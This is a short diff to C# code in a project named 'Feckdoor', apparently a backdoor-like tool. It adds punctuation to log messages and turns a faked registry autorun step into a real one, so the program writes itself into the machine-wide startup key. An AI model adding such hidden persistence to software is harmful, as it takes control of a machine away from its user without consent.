@@ -164,12 +164,12 @@ namespace Feckdoor
 				{
 					if (Registry.LocalMachine.OpenSubKey(autorunKey)?.GetValue(autorunValue) == null)
 					{
-						Log.Warning("Autorun entry not found on {location}", autorunPath);
+						Log.Warning("Autorun entry not found on {location}.", autorunPath);
 					}
 					else
 					{
 						Registry.LocalMachine.CreateSubKey(autorunKey)?.DeleteValue(autorunValue);
-						Log.Information("Removed autorun entry from {location}", autorunPath);
+						Log.Information("Removed autorun entry from {location}.", autorunPath);
 					}
 					return true;
 				}
@@ -177,8 +177,8 @@ namespace Feckdoor
 				string? exepath = Assembly.GetEntryAssembly()?.Location ?? Assembly.GetExecutingAssembly()?.Location;
 				if (exepath != null && Registry.LocalMachine.OpenSubKey(autorunKey)?.GetValue(autorunValue) == null)
 				{
-					// Registry.LocalMachine.CreateSubKey(autorunKey)?.SetValue(autorunValue, exepath);
-					Log.Information("[FAKE]Added autorun entry to {location}", autorunPath);
+					Registry.LocalMachine.CreateSubKey(autorunKey)?.SetValue(autorunValue, exepath);
+					Log.Information("Added autorun entry to {location}.", autorunPath);
 				}
 			}
 			catch (Exception e)
